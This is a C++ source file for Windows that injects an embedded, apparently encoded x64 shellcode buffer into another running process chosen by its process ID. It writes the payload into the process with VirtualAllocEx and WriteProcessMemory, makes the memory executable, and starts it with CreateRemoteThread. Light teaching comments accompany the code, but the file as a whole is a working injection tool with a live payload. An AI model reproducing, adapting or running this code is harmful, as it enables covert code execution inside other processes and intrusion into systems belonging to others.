#include <iostream>
#include <windows.h>

int main()
{

unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xde\x7c\x88\x77\xf2\x70\x44\x28\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x22\x34\x0b"
"\x93\x02\x98\x88\x28\xde\x7c\xc9\x26\xb3\x20\x16\x60\xef"
"\xae\xd9\x12\xba\xfb\x16\x48\x96\xf7\xda\x6f\xa4\x38\xcf"
"\x7a\xfe\x34\x03\x05\xa2\x38\x4b\x9f\x94\x36\xc5\x46\x3b"
"\x38\x75\xe8\x72\x40\xe9\x0b\xf0\x5c\x64\x69\x1f\xb5\x85"
"\x36\xf3\xb1\xa6\xc5\x8c\x3d\xd9\x3f\x79\x22\x64\xa3\x9c"
"\x40\xc0\x76\x22\x16\xc5\x50\xc6\x77\x8a\x78\x77\x02\x44"
"\x28\xde\xf7\x08\xff\xf2\x70\x44\x60\x5b\xbc\xfc\x10\xba"
"\x71\x94\x78\x55\x34\x90\x33\x79\x30\x64\x61\xdf\xac\x6b"
"\x21\xbf\x41\x8d\x60\x21\xb5\xc9\xfc\xc6\xf8\x0c\x29\x08"
"\x34\xb9\xb7\xb3\xb1\x8d\x25\x72\x3d\x89\xb6\xca\x90\x31"
"\xd9\x92\x7f\xc4\x53\xfa\x35\x7d\xf9\xab\xa4\xd0\x33\x79"
"\x30\x60\x61\xdf\xac\xee\x36\x79\x7c\x0c\x6c\x55\x3c\x94"
"\x3e\xf3\xa0\x05\xa3\xda\xf4\xc9\x2f\xb3\x28\x1a\x60\xdf"
"\xac\xd1\x2d\xb3\x28\x05\x71\x9f\x26\xc0\xf4\x1e\x50\x05"
"\x7a\x21\x9c\xd0\x36\xab\x2a\x0c\xa3\xcc\x95\xc3\x88\x0d"
"\x8f\x19\x61\x60\x0b\xfb\x45\xad\x43\x76\x28\xde\x3d\xde"
"\x3e\x7b\x96\x0c\xa9\x32\xdc\x89\x77\xf2\x39\xcd\xcd\x97"
"\xc0\x8a\x77\xe3\x2c\x84\x80\xdf\x16\xc9\x23\xbb\xf9\xa0"
"\x64\x57\x8d\xc9\xcd\xbe\x07\x62\x2f\x21\xa9\xc4\xfe\x18"
"\x18\x45\x29\xde\x7c\xd1\x36\x48\x59\xc4\x43\xde\x83\x5d"
"\x1d\xf8\x31\x1a\x78\x8e\x31\xb9\xbe\xbf\x41\x84\x60\x21"
"\xbc\xc0\xfe\x30\x38\xbb\xe8\x96\xf5\x49\x36\x48\x9a\x4b"
"\xf7\x3e\x83\x5d\x3f\x7b\xb7\x2e\x38\x9f\x24\xc4\xfe\x10"
"\x38\xcd\xd1\x9f\xc6\x11\xd2\x86\x11\xbb\xfd\x5b\xbc\xfc"
"\x7d\xbb\x8f\x8a\x5d\x3b\x94\x1b\x77\xf2\x70\x0c\xab\x32"
"\x6c\xc0\xfe\x10\x3d\x75\xe1\xb4\x78\xc9\x2f\xba\xf9\xbd"
"\x69\x64\x7e\x51\xbf\xad\x8f\x91\xab\x26\x7c\xf6\x22\xba"
"\xf3\x80\x08\x80\xf5\x7e\x1d\xb2\x31\x1d\x40\xde\x6c\x88"
"\x77\xb3\x28\x0c\xa1\x2c\x34\xb9\xbe\xb3\xca\x1c\x8c\x8d"
"\x99\x77\xa2\xba\xf9\x87\x61\x57\xbb\xc5\x46\x3b\x39\xcd"
"\xd8\x96\xf5\x52\x3f\x7b\x89\x05\x92\xdc\xa5\x40\x28\x0d"
"\xa5\xc7\xd0\xde\x01\xa0\x2f\xb3\x27\x1d\x40\xde\x3c\x88"
"\x77\xb3\x28\x2e\x28\x84\x3d\x32\x7c\xdd\x7f\x74\xd7\x0b"
"\x2b\xd1\x36\x48\x05\x2a\x65\xbf\x83\x5d\x3e\x0d\xbe\xad"
"\x14\x21\x83\x77\x3f\xf3\xb3\x0c\x01\x18\x34\x0d\x81\x87"
"\xc4\x05\xd7\x39\x24\xe2\x77\xab\x39\x83\xea\x2e\xc9\x2a"
"\x21\x0d\xa5\x44\x28";


    int processID = 0;
    std::cout << "Give Process ID: ";
    std::cin >> processID;

    // Handle allows us to interact with files, a process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);

    // OpenProcess() tries to get access to a running process
    if (hProcess == NULL) {
        std::cout << "Error Opening process: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "Successfully Opened process with ID: " << processID;

    // Allocate memory to the process - returns a pointer location where the memory was located
    LPVOID pBufferLocation = VirtualAllocEx(hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pBufferLocation == NULL) {
        std::cout << "Error Allocating memory inside the process: " << GetLastError() << std::endl;
        return 1;
    }

    SIZE_T bytesWritten = 0;
    // We write to the memory we allocated
    if (!WriteProcessMemory(hProcess, pBufferLocation, buf, sizeof(buf), &bytesWritten)) {
        std::cout << "Error writing to memory inside the process: " << GetLastError();
        return 1;
    }

    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, pBufferLocation, sizeof(buf), PAGE_EXECUTE_READ, &oldProtect)) {
        std::cout << "Error Changing protection of memory inside the process: " << GetLastError();
        return 1;
    }

    // Execute using a thread    
    DWORD ThreadID = 0;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pBufferLocation, NULL, 0, &ThreadID);

    if (hThread == NULL) {
        std::cout << "Error Creating thread: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "It works threadID is: " << ThreadID << std::endl;

    return 0;
}